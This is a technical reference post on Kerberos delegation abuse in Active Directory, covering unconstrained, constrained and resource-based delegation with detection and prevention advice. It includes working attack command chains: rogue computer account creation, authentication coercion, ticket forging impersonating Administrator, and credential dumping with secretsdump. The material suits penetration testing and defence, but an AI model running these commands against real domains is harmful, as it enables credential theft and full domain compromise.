---
title: Kerberos Delegation Attacks
layout: post
date: 2025-09-12
description: "Kerberos delegation is a powerful feature in Active Directory that allows a service to impersonate a user to access other services on their behalf. While this functionality is essential for many applications, it can be abused by attackers to escalate privileges and move laterally within a domain."
permalink: /theory/windows/delegation/
---

# Kerberos Delegation Attacks

## Overview

Kerberos delegation is a powerful feature in Active Directory that allows a service to impersonate a user to access other services on their behalf. While this functionality is essential for many applications, it can be abused by attackers to escalate privileges and move laterally within a domain.

## What is Kerberos Delegation?

Kerberos delegation allows a service account to request tickets on behalf of users to access other services. This is particularly useful in multi-tier applications where:

1. A user authenticates to a web application
2. The web application needs to access a database on behalf of the user
3. The database should see the request as coming from the original user, not the service account

## Types of Kerberos Delegation

There are three main types of Kerberos delegation:

### Unconstrained Delegation (KUD)
- **Description:** Allows a service to impersonate users to any service in the domain
- **Risk Level:** High - Can lead to complete domain compromise
- **Configuration:** `TRUSTED_FOR_DELEGATION` flag in userAccountControl
- **Attack Vector:** Capture TGTs from high-privilege accounts

### Constrained Delegation (KCD)
- **Description:** Limits delegation to specific services only
- **Risk Level:** Medium-High - Limited but still dangerous
- **Configuration:** two flavours share the same `msDS-AllowedToDelegateTo` attribute (a list of allowed SPNs):
    - **Vanilla KCD:** `msDS-AllowedToDelegateTo` set, `TRUSTED_TO_AUTH_FOR_DELEGATION` **not** set. The service can only delegate for users who *already* presented a forwardable TGT to it.
    - **KCD with Protocol Transition (KCD/PT):** `msDS-AllowedToDelegateTo` set **and** `TRUSTED_TO_AUTH_FOR_DELEGATION` set. The service can request a forwardable ticket for *any* user via S4U2Self, without them ever authenticating to it first. This is the attacker-friendly variant.
- **Attack Vector:** Abuse S4U2Self and S4U2Proxy extensions, plus **AnySPN / sname rewriting** (see below) and **`WriteSPN` SPN-jacking** to break out of the `msDS-AllowedToDelegateTo` allowlist.

### Resource-Based Constrained Delegation (RBCD)
- **Description:** The target service controls who can delegate to it
- **Risk Level:** Medium - More secure but still exploitable
- **Configuration:** `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute
- **Attack Vector:** Modify the target service's delegation settings

---

## Unconstrained Delegation (KUD)

### What is Unconstrained Delegation?

Unconstrained delegation allows a service to:
- Request tickets on behalf of any user
- Access any service in the domain using those tickets
- Store and reuse captured TGTs (Ticket Granting Tickets)

This is configured by setting the `TRUSTED_FOR_DELEGATION` flag in the `userAccountControl` attribute of a user or computer account.

### How Unconstrained Delegation Works

#### Normal Kerberos Flow
1. User authenticates to KDC and receives a TGT
2. User requests a service ticket for a specific service
3. Service validates the ticket and grants access

#### With Unconstrained Delegation
1. User authenticates to KDC and receives a TGT
2. User requests a service ticket for the delegation-enabled service
3. **The service can request additional tickets on behalf of the user**
4. The service stores the user's TGT for future use
5. The service can impersonate the user to any other service

### Unconstrained Delegation Attack Vectors

#### TGT Capture Attack

**Scenario:** An attacker controls a service with unconstrained delegation and captures TGTs from high-privilege users.

**Attack Steps:**
1. Identify services with unconstrained delegation
2. Compromise the service account
3. Force high-privilege users to authenticate to the service
4. Capture their TGTs
5. Use captured TGTs to access other services

**Tools:**
- `PrinterBug` - Forces Domain Controller authentication
- `PetitPotam` - Alternative coercion method
- `KrbRelayX` - Captures and relays tickets

#### Computer Account Abuse

**Scenario:** A computer account with unconstrained delegation can be abused to capture TGTs.

**Attack Steps:**
1. Create a computer account (if possible)
2. Configure it for unconstrained delegation
3. Force authentication to the computer
4. Capture TGTs and use them for lateral movement

### Unconstrained Delegation Practical Attack Example

#### Step 1: Identify Unconstrained Delegation

```powershell
# Find computers with unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# Find users with unconstrained delegation
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
```

#### Step 2: Create Attack Infrastructure

```bash
# Create a computer account
addcomputer.py -dc-ip 10.10.10.10 -computer-name evil$ -computer-pass P@ssw0rd! domain/user:password

# Configure for unconstrained delegation
bloodyAD --host 10.10.10.10 -u user -p password -d domain add uac -f TRUSTED_FOR_DELEGATION evil$
```

#### Step 3: Force Authentication

```bash
# Using PrinterBug
printerbug.py domain/user:password@target.domain.local evil.domain.local

# Using PetitPotam
PetitPotam.py -u evil$ -p 'P@ssw0rd!' -d domain -dc-ip 10.10.10.10 evil.domain.local 10.10.10.10
```

#### Step 4: Capture and Use Tickets

```bash
# Set up KrbRelayX to capture tickets
krbrelayx.py --krbsalt 'DOMAINevil' --krbpass 'P@ssw0rd!' --interface-ip 10.10.14.5

# Use captured tickets
export KRB5CCNAME=DC1\$@DOMAIN.COM_krbtgt@DOMAIN.COM.ccache
secretsdump.py -k -no-pass 'DC1$@dc1.domain.local'
```

### Unconstrained Delegation Detection

#### PowerShell Detection

```powershell
# Find all accounts with unconstrained delegation
$computers = Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
$users = Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

Write-Host "Computers with Unconstrained Delegation:"
$computers | Select-Object Name, DistinguishedName

Write-Host "Users with Unconstrained Delegation:"
$users | Select-Object Name, DistinguishedName
```

#### BloodHound Queries

```cypher
// Find computers with unconstrained delegation
MATCH (c:Computer) WHERE c.unconstraineddelegation = true RETURN c

// Find users with unconstrained delegation
MATCH (u:User) WHERE u.unconstraineddelegation = true RETURN u
```

---

## Constrained Delegation (KCD)

### What is Constrained Delegation?

Constrained delegation allows a service to:
- Impersonate users to specific services only
- Use the S4U2Self and S4U2Proxy Kerberos extensions
- Request service tickets for predefined SPNs (Service Principal Names)

This is configured by setting the `TRUSTED_TO_AUTH_FOR_DELEGATION` flag in the `userAccountControl` attribute along with specific SPNs in the `msDS-AllowedToDelegateTo` attribute.

### How Constrained Delegation Works

#### S4U2Self (Service for User to Self)

1. A service requests a ticket for an arbitrary user (usually `Administrator`) *to itself*.
2. The KDC issues that ticket unconditionally (S4U2Self always succeeds), **but the ticket is forwardable only if the service account has `TRUSTED_TO_AUTH_FOR_DELEGATION` set on its `userAccountControl`.**
3. That forwardable bit is the whole point: only a forwardable S4U2Self ticket can be fed into S4U2Proxy. A non-forwardable ticket is useful for local access checks but is a dead end for delegation.

**Consequence:** on paper a KCD attack "requires" the impersonated user's cooperation. In practice, the `TRUSTED_TO_AUTH_FOR_DELEGATION` flag ("protocol transition", see below) *removes* that requirement, and every real-world KCD abuse assumes the service has it. Without the flag you are looking at a much narrower "wait for a real forwardable TGT to arrive" scenario.

#### S4U2Proxy (Service for User to Proxy)

1. A service presents a forwardable ticket (obtained via S4U2Self or a real user's forwarded TGT).
2. It asks the KDC for a service ticket to a target SPN, *on behalf of* the ticket's `cname`.
3. The KDC checks the requester's `msDS-AllowedToDelegateTo` list: if the target SPN is not on the list, the request is refused.
4. If accepted, the KDC issues a service ticket where:
    - the `cname` is the impersonated user,
    - the ticket is **encrypted with the long-term key of whichever account currently registers the target SPN**.
5. The requester now holds a valid ticket that authenticates to the target service as the impersonated user.

**Two invariants that the attacker abuses in AnySPN and SPN-jacking (below):**

- The KDC picks the encryption key by SPN owner, not by SPN string. Any two SPNs registered on the same account produce mutually-swappable tickets.
- The `sname` field on the ticket is not integrity-protected against the client; only the ticket body (cname, session key, PAC) is signed. The client can rewrite `sname` between receiving the ticket and presenting it.

#### Protocol Transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`)

- **With Protocol Transition (`TRUSTED_TO_AUTH_FOR_DELEGATION` = true):** S4U2Self returns a **forwardable** ticket for any user. The service can therefore always feed S4U2Proxy and effectively impersonate any user to the SPNs in its allowlist. This is the attacker-friendly configuration.
- **Without Protocol Transition (`TRUSTED_TO_AUTH_FOR_DELEGATION` = false):** S4U2Self still succeeds, but the returned ticket is **non-forwardable**. S4U2Proxy will refuse it. The service can only delegate a client's forwardable TGT that it already received during a real authentication (typically Negotiate → Kerberos over HTTP or RPC).

Colloquially "protocol transition" means "the service can bridge from non-Kerberos auth (or no auth at all) to a Kerberos service ticket for the user". Technically it just means "S4U2Self returns forwardable tickets".

### Constrained Delegation Attack Vectors

#### S4U2Self and S4U2Proxy Abuse

**Scenario:** An attacker compromises a service account with constrained delegation and uses it to impersonate users.

**Attack Steps:**
1. Identify services with constrained delegation
2. Obtain service account credentials
3. Use S4U2Self to get a ticket for a user to the service
4. Use S4U2Proxy to get a ticket to the target service
5. Access the target service as the impersonated user

#### Protocol Transition Bypass

**Scenario:** When protocol transition is disabled, attackers can use alternative methods to obtain forwardable tickets.

**Attack Methods:**
- **RBCD Attack:** Configure resource-based constrained delegation
- **Ticket Capture:** Wait for users to authenticate to the service
- **Self-RBCD:** Use computer account self-delegation (patched in 2022)

### Constrained Delegation Practical Attack Example

#### Step 1: Identify Constrained Delegation

```powershell
# Find computers with constrained delegation
Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation, msDS-AllowedToDelegateTo

# Find users with constrained delegation
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation, msDS-AllowedToDelegateTo
```

#### Step 2: With Protocol Transition

```bash
# Direct S4U2Self + S4U2Proxy attack
getST.py -spn "cifs/target.domain.local" -impersonate "Administrator" "domain/service:password"
```

#### Step 3: Without Protocol Transition (RBCD Approach)

```bash
# Step 1: Configure RBCD on the target service. Any account that ends up in
#         target$'s msDS-AllowedToActOnBehalfOfOtherIdentity is treated as if
#         it had TRUSTED_TO_AUTH_FOR_DELEGATION w.r.t. target$.
bloodyAD --host 10.10.10.10 -u user -p password -d domain add rbcd -t target$ -f evil$

# Step 2: One-shot S4U2Self + S4U2Proxy as evil$. getST.py chains both calls
#         internally when the requester is in target$'s RBCD list, and drops the
#         final "Administrator to cifs/target.domain.local" ticket to disk.
getST.py -spn "cifs/target.domain.local" \
         -impersonate "Administrator" \
         "domain/evil\$:password"

# Step 3: (optional) -additional-ticket <ccache> only comes into play for
#         chained delegation across two services. The ccache passed here MUST
#         be a prior S4U2Self result (a forwardable ticket to itself), not an
#         arbitrary service ticket. Typical use: pass an S4U2Self ticket for
#         one service and let getST re-issue an S4U2Proxy to a second SPN.
```

### Constrained Delegation Detection

#### PowerShell Detection

```powershell
# Find all accounts with constrained delegation
$computers = Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation, msDS-AllowedToDelegateTo
$users = Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation, msDS-AllowedToDelegateTo

Write-Host "Computers with Constrained Delegation:"
$computers | Select-Object Name, msDS-AllowedToDelegateTo

Write-Host "Users with Constrained Delegation:"
$users | Select-Object Name, msDS-AllowedToDelegateTo
```

#### BloodHound Queries

```cypher
// Find computers with constrained delegation
MATCH (c:Computer) WHERE c.constraineddelegation = true RETURN c

// Find delegation paths
MATCH (c:Computer)-[r:AllowedToDelegate]->(t:Computer) RETURN c, r, t
```

### Constrained Delegation Attack Variations

#### Bronze Bit Attack (CVE-2020-17049)

- Exploits an S4U2Proxy check that let a service turn a *non-forwardable* S4U2Self ticket into a forwardable service ticket by flipping the `forwardable` bit and re-signing.
- Effectively removes the "requires `TRUSTED_TO_AUTH_FOR_DELEGATION`" precondition for KCD abuse.
- Patched in Windows updates in late 2020. Impacket's `getST.py -force-forwardable` invokes the pre-patch behaviour and is only interesting on unpatched hosts.

#### AnySPN / sname rewriting (`-altservice`)

This is not a bug, it is how Kerberos is designed. A service ticket is encrypted with the **long-term key of the account that owns the target SPN**. The `sname` field (`<serviceclass>/<host>`) inside the ticket tells the target service which service it is, but that field is signed by the KDC only, not integrity-protected against the client. Once the client holds a ticket, it can rewrite `sname` to any other SPN owned by the same account and the target will accept it, because decryption still succeeds with the same key.

**Practical consequence:** if you obtain a KCD service ticket for `HTTP/target.domain.local`, you can freely swap `sname` to `cifs/target.domain.local`, `LDAP/target.domain.local`, `HOST/target.domain.local`, etc. `msDS-AllowedToDelegateTo` bounds *which SPN string the KDC will accept in the request*; it does not bound *which service class the ticket ultimately unlocks*.

Impacket exposes this with the `-altservice` flag on `getST.py`:

```bash
# Original request: HTTP/target (in the allowed-to-delegate list)
# Rewritten to: cifs/target (was not in the list, but same key)
getST.py -spn 'HTTP/target.domain.local' \
         -impersonate 'Administrator' \
         -altservice 'cifs/target.domain.local' \
         domain/service:password
```

Two operational quirks:

- **Always use the FQDN form of the SPN** (`cifs/target.domain.local`, not `cifs/target`). Some clients (netexec/nxc's SMB module in particular) always canonicalise short forms to the full FQDN before sending the AP-REQ, and a mismatch produces `KDC_ERR_PREAUTH_FAILED` on the target. Impacket's own `smbclient.py` accepts the short form; nxc does not.
- **Case matters in some Windows builds.** `CIFS/host` and `cifs/host` should be equivalent, but Windows service-class matching has historically been case-insensitive in the KDC and case-sensitive in some client-side lookups. Lowercase everywhere unless a working example says otherwise.

#### `WriteSPN` SPN-jacking

`WriteSPN` (`WriteProperty` on `servicePrincipalName`) on a *computer object* is enough to steal the "AnySPN" invariant for a service class the KDC would not otherwise let you request. The pattern:

1. The attacker controls an account with KCD/PT (say, `svc_it_admin` in the Nova Forge writeup) whose `msDS-AllowedToDelegateTo` lists an SPN like `CIFS/STORAGE.novaforge.local`.
2. That SPN is *not currently registered* on `STORAGE$`, so `getST.py` for it would fail with `KDC_ERR_S_PRINCIPAL_UNKNOWN`.
3. The attacker also has `WriteSPN` on some *other* computer object, typically the DC. They register the exact same SPN string on the DC: `bloodyAD msldap addspn CN=DC,... CIFS/STORAGE.novaforge.local`.
4. Now `getST.py -spn CIFS/STORAGE.novaforge.local` succeeds, but the returned ticket is encrypted with **`DC$`'s key**, because `DC$` is the account currently owning that SPN.
5. The attacker rewrites `sname` to a real service on `DC` via `-altservice 'cifs/DC.novaforge.local'` and lands on the DC as the impersonated user.

**Why it works:** the KDC ties the encryption key to the SPN owner (step 4), while `msDS-AllowedToDelegateTo` only checks the SPN *string* (step 3). Registering the string on any writeable computer object bridges the two.

**Why `WriteSPN` matters as much as `GenericAll` on the target:** it looks narrow ("only add/remove SPNs on this object") but composes with any existing KCD/PT configuration into a full DC compromise. Audit `WriteSPN` on Tier-0 computer objects with the same rigour as `GenericAll`.

---

## Resource-Based Constrained Delegation (RBCD)

### What is Resource-Based Constrained Delegation?

RBCD allows a service to:
- Control who can delegate to it through the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute
- Specify which accounts can perform S4U2Self and S4U2Proxy operations
- Provide more granular control over delegation permissions

This is configured by setting the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the target service, which contains a list of security principals that can delegate to it.

### How RBCD Works

#### Traditional Delegation vs RBCD

**Traditional Delegation:**
- The delegating service controls who it can delegate to
- Configured on the source service account
- Less secure as the source controls the delegation

**RBCD:**
- The target service controls who can delegate to it
- Configured on the target service account
- More secure as the target controls the delegation

#### S4U2Self and S4U2Proxy with RBCD

1. **S4U2Self:** A service requests a ticket for a user to itself
2. **S4U2Proxy:** The service uses the forwardable ticket to request access to the target service
3. **Target Validation:** The target service checks if the requesting service is in its `msDS-AllowedToActOnBehalfOfOtherIdentity` list

### RBCD Attack Vectors

#### RBCD Configuration Abuse

**Scenario:** An attacker can modify a service's RBCD settings to allow their own account to delegate to it.

**Attack Steps:**
1. Identify services that can be modified
2. Create a computer account or use an existing one
3. Modify the target service's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute
4. Perform S4U2Self and S4U2Proxy attacks

#### Computer Account Self-Delegation

**Scenario:** A computer account can modify its own RBCD settings (patched in 2022).

**Attack Steps:**
1. Compromise a computer account
2. Add the computer account to its own RBCD list
3. Perform delegation attacks

#### RBCD for Lateral Movement

**Scenario:** Use RBCD to move laterally between services in the domain.

**Attack Steps:**
1. Identify services with RBCD capabilities
2. Modify RBCD settings to allow delegation
3. Use captured credentials to perform delegation attacks
4. Move to higher-privilege services

### RBCD Practical Attack Example

#### Step 1: Identify RBCD Capabilities

```powershell
# Find services with RBCD configured
Get-ADComputer -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -ne $null} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

# Find services that can be modified
Get-ADComputer -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -eq $null} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

#### Step 2: Create Attack Infrastructure

```bash
# Create a computer account
addcomputer.py -dc-ip 10.10.10.10 -computer-name evil$ -computer-pass P@ssw0rd! domain/user:password
```

#### Step 3: Configure RBCD

```bash
# Using bloodyAD
bloodyAD --host 10.10.10.10 -u user -p password -d domain add rbcd -t target$ -f evil$

# Using PowerView
Set-ADComputer -Identity "target$" -PrincipalsAllowedToDelegateToAccount "evil$"
```

#### Step 4: Perform Delegation Attack

```bash
# S4U2Self + S4U2Proxy attack
getST.py -spn "cifs/target.domain.local" -impersonate "Administrator" "domain/evil$:password"

# Use the ticket
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass 'target$@target.domain.local'
```

### RBCD Detection

#### PowerShell Detection

```powershell
# Find services with RBCD configured
$rbcd = Get-ADComputer -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -ne $null} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

Write-Host "Services with RBCD configured:"
foreach ($service in $rbcd) {
    Write-Host "Service: $($service.Name)"
    Write-Host "Allowed Principals: $($service.'msDS-AllowedToActOnBehalfOfOtherIdentity')"
}
```

#### BloodHound Queries

```cypher
// Find RBCD relationships
MATCH (c:Computer)-[r:AllowedToAct]->(t:Computer) RETURN c, r, t

// Find computers that can be delegated to
MATCH (c:Computer) WHERE c.allowedtoact = true RETURN c
```

### RBCD Attack Variations

#### Self-RBCD Attack
- Computer accounts can modify their own RBCD settings
- Patched in Windows updates around August/September 2022
- Still works with other accounts for RBCD

#### RBCD Chain Attacks
- Use RBCD to move between multiple services
- Create chains of delegation for lateral movement
- Can lead to domain compromise

---

## Detection and Prevention

### General Detection Methods

#### Event Log Monitoring

Monitor for:
- Event ID 4624: Successful logon events
- Event ID 4769: Kerberos service ticket requests
- Event ID 4776: Domain controller attempted to validate credentials

#### Network Monitoring

- Monitor for suspicious Kerberos traffic
- Look for unusual delegation patterns
- Track service ticket requests

### Prevention Strategies

#### 1. Avoid Unconstrained Delegation
- Use constrained delegation instead
- Use resource-based constrained delegation when possible
- Regularly audit delegation configurations

#### 2. Protected Users Group

`Protected Users` membership sets several restrictions on the *member* account:

- The account cannot be delegated to. The KDC refuses S4U2Self and S4U2Proxy requests that try to impersonate a Protected Users member (equivalent to setting `AccountNotDelegated` on the account).
- The account's Kerberos tickets are non-forwardable and non-proxiable by policy.
- NTLM auth is disabled for the account, forcing Kerberos everywhere.
- Long-term Kerberos keys are limited to AES; DES and RC4-HMAC are disabled.
- TGT lifetime is capped at 4 hours (no renewal).

```powershell
# Add sensitive accounts to Protected Users group
Add-ADGroupMember -Identity "Protected Users" -Members "Administrator", "Domain Admins"
```

Two things worth calling out:

- **PU protects the member from being impersonated, not from impersonating.** A service account in `Protected Users` that also has `TRUSTED_TO_AUTH_FOR_DELEGATION` can still perform S4U2Self and S4U2Proxy to impersonate other users. PU only blocks S4U2Self / S4U2Proxy calls that target a PU member as the *impersonated user*.
- **PU membership propagates lazily.** The account must acquire a new TGT after being added to the group before the restrictions take effect on its outbound requests. Blue teams that add an account to PU and then observe "PU restrictions aren't kicking in" are usually looking at a ticket issued before the group change.

#### 3. Regular Auditing
```powershell
# Regular audit script
$delegation = Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
if ($delegation) {
    Write-Warning "Found computers with unconstrained delegation: $($delegation.Name)"
}
```

#### 4. Network Segmentation
- Isolate services with delegation
- Monitor network traffic for suspicious Kerberos activity
- Implement network access controls

#### 5. Principle of Least Privilege
- Only grant delegation to necessary services
- Regularly review delegation configurations
- Remove unnecessary delegation rights

### Common Misconfigurations

1. **Overly Permissive Delegation:** Services with delegation to too many resources
2. **Weak Service Account Passwords:** Easily crackable service account credentials
3. **Missing Protected Users:** High-privilege accounts not protected from delegation
4. **Legacy Configurations:** Old delegation settings not updated
5. **Missing Monitoring:** No detection of delegation abuse

---

## Tools and Resources

### Attack Tools
- `Impacket` - Python network protocols
- `Rubeus` - C# Kerberos attacks
- `KrbRelayX` - Ticket capture and relay
- `PrinterBug` - Authentication coercion
- `PetitPotam` - Alternative coercion method
- `bloodyAD` - Python AD manipulation
- `PowerView` - PowerShell AD enumeration

### Detection Tools
- `BloodHound` - AD attack path analysis
- `ADRecon` - AD security assessment
- `PowerShell` - Native Windows enumeration
- `CrackMapExec` - Network exploitation

### Monitoring Tools
- Windows Event Logs
- SIEM solutions
- Network monitoring tools

---

## References

- [The Hacker Recipes - Kerberos Delegations](https://www.thehacker.recipes/ad/movement/kerberos/delegations/)
- [The Hacker Recipes - Unconstrained Delegation](https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained)
- [The Hacker Recipes - Constrained Delegation](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained)
- [Crowsec - Kerberos Delegation Attacks](https://blog.crowsec.com.br/kerberos-delegation-attacks/)
- [IRED Team - Kerberos Abuse](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [ADSecurity - Kerberos Delegation](https://adsecurity.org/?p=1667)
- [Decoder.cloud - Reflecting your authentication (CVE-2025-33073 CMTI)](https://decoder.cloud/2025/11/24/reflecting-your-authentication-when-windows-ends-up-talking-to-itself/)

---
